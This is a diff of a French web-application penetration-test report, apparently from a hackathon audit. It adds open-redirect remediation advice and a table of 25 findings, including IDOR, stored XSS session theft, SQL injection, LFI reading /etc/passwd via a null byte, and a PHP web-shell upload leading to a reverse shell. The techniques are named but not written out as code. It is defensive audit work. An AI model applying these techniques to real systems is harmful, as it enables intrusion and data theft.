 ![alt text](src/image-9.png)
+
+**🛠️ Recommandations de remédiation immédiate :**
+
+- N’accepter que des chemins relatifs, pas d’URL complètes.
+- Utiliser une liste blanche de domaines/URLs autorisées.
+- Valider et canoniser la valeur envoyée avant toute redirection.
+- Refuser toute valeur contenant javascript:, data:, ou schémas non-HTTP(S).
+- Mapper des clés pré-approuvées (page=dashboard) plutôt que d’accepter une URL fournie.
+- Stocker côté serveur la destination post-login (origine connue) au lieu de la transmettre par paramètre.
+- Signer les URLs de redirection avec un jeton à usage unique et vérifier la signature.
+- Vérifier l’hôte de destination et n’autoriser que l’hôte applicatif ou domaines explicitement allowlistés.
+- Bloquer les redirections vers les sous-domaines non approuvés.
+- Ajouter un écran intermédiaire de confirmation pour redirections externes.
+- Journaliser et alerter les tentatives de redirection non autorisées.
+- Couvrir par tests automatisés (CI) les payloads open-redirect classiques.
+- Revue de code obligatoire pour tout changement du flux d’authentification/redirection.
+- Refuser les paramètres encodés ambiguës et normaliser l’input avant vérification.
 
 ##### 11. Côté client
 
@@ -911,11 +1130,34 @@ Outils utilisés : Nmap, Nikto, Burp Suite, OWASP ZAP, sqlmap, ffuf
 
 ### 5.2 PRÉSENTATION DES RÉSULTATS
 
-| Vulnérabilité         | Gravité | Référentiel OWASP | Statut   |
-|------------------------|---------|--------------------|----------|
-| SQLi                   | Critique| A1: Injection       | Confirmée|
-| XSS                    | Moyenne | A7: XSS             | Confirmée|
-| Mauvaise config TLS    | Faible  | A6: Security Misconf| Observée|
+| #  | Intitulé                                                                                                              | Exploitation | Impact    | Criticité |
+|----|-----------------------------------------------------------------------------------------------------------------------|--------------|-----------|-----------|
+| 1  | Exposition publique du fichier `swagger.json` (cartographie complète des API)                                        | Haut         | Élevé     | CRITIQUE  |
+| 2  | Absence d’en‑têtes de sécurité HTTP (HSTS, CSP, X-Frame-Options, X-Content-Type-Options, etc.)                        | Moyen        | Élevé     | ÉLEVÉ     |
+| 3  | Divulgation d’informations techniques via `Server` / `X-Powered-By` (Nginx, PHP 5.6.40)                                | Moyen        | Moyen     | MOYEN     |
+| 4  | Absence de validation d’email à l’inscription (pas de confirmation)                                                   | Haut         | Moyen     | ÉLEVÉ     |
+| 5  | Impossible de modifier le mot de passe depuis le profil utilisateur                                                   | Moyen        | Élevé     | ÉLEVÉ     |
+| 6  | Acceptation de mots de passe faibles (pas de politique / blacklist)                                                    | Haut         | Élevé     | CRITIQUE  |
+| 7  | Bruteforce possible (pas de protection anti‑brute force / rate limiting) — Hydra a réussi                             | Élevé        | Élevé     | CRITIQUE  |
+| 8  | Acceptation non documentée de méthodes HTTP sur `/api/user/{user_id}` (GET/DELETE/POST alors que seul PUT documenté)  | Moyen        | Élevé     | ÉLEVÉ     |
+| 9  | IDOR sur `/api/user/{id}` : modification de tous les comptes via PUT (absence d’object-level auth)                     | Élevé        | Critique  | CRITIQUE  |
+| 10 | IDOR sur `/api/order`, `/api/cart`, `/api/customerAddress` : lecture/écriture des données d'autres utilisateurs       | Élevé        | Élevé     | CRITIQUE  |
+| 11 | Possibilité de modifier le champ `active` pour désactiver tous les comptes                                            | Élevé        | Élevé     | CRITIQUE  |
+| 12 | XSS stockée sur page FAQ — vol de session (PHPSESSID accessible) → usurpation de comptes (ex : jdoe)                   | Élevé        | Critique  | CRITIQUE  |
+| 13 | Cookies de session non sécurisés (pas HttpOnly, pas Secure, pas SameSite attentionnée)                                | Moyen        | Élevé     | ÉLEVÉ     |
+| 14 | Injection de commandes via paramètre de chemin (inclusion/exécution par concaténation / shell)                        | Élevé        | Critique  | CRITIQUE  |
+| 15 | SQL Injection sur `/product/view?id=` (exfiltration tbl_users, hashes de mots de passe)                                | Élevé        | Critique  | CRITIQUE  |
+| 16 | LFI via `account/help_articles?page=` (lecture de `/etc/passwd` avec `%00` null byte)                                  | Élevé        | Critique  | CRITIQUE  |
+| 17 | Téléversement non sécurisé (upload d’un shell PHP dans `/user_pictures/`) — exécution → RCE & reverse shell possible  | Élevé        | Critique  | CRITIQUE  |
+| 18 | Exfiltration via reverse shell / archive des fichiers accessibles depuis webroot                                      | Élevé        | Critique  | CRITIQUE  |
+| 19 | Fichiers de configuration contenant credentials exposés (ex : config/db credentials accessibles)                       | Élevé        | Critique  | CRITIQUE  |
+| 20 | Affichage d’erreurs PHP/JS en production (stack traces, chemins absolus)                                               | Faible       | Moyen     | MOYEN     |
+| 21 | Redirection ouverte (`return_url`) facilitant phishing / redirection vers sites malveillants                            | Moyen        | Moyen     | MOYEN     |
+| 22 | Directory listing / services non nécessaires exposés (ex: port 9002 / index listing)                                   | Faible       | Moyen     | MOYEN     |
+| 23 | Manque de RBAC formel / découverte aisée du panneau admin (`/admin`)                                                    | Moyen        | Élevé     | ÉLEVÉ     |
+| 24 | Absence de filtrage / sanitisation dans `contactMessages` (XSS stocké et données personnelles visibles)                 | Moyen        | Élevé     | ÉLEVÉ     |
+| 25 | Usage de versions obsolètes / non maintenues (ex : PHP 5.6.40 détecté)                                                  | Moyen        | Élevé     | ÉLEVÉ     |
+
 
 ### 5.3 TERMINOLOGIE DES RISQUES
 
@@ -924,8 +1166,3 @@ Outils utilisés : Nmap, Nikto, Burp Suite, OWASP ZAP, sqlmap, ffuf
 - **Faible** : Failles de configuration ou de bonnes pratiques
 
 ---
-
-**Fait par :**  
-_Équipe Audit Sécurité – [Nom de l’entreprise / Hackathon Team]_  
-**Date :** _[JJ/MM/AAAA]_
-
